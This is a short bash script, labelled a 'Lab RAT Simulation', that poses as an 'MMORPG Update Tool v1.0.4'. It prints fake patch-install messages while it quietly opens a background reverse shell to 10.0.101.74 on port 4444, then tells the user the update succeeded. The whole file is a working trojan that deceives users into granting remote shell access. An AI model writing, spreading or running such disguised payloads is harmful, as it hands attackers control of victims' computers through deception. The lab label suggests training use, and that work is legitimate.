#!/bin/bash
# Lab RAT Simulation
echo "MMORPG Update Tool v1.0.4"
echo "Installing patches..."
# This opens a reverse shell to your server's IP on port 4444
bash -i >& /dev/tcp/10.0.101.74/4444 0>&1 & 
echo "Update complete. Please restart the game client."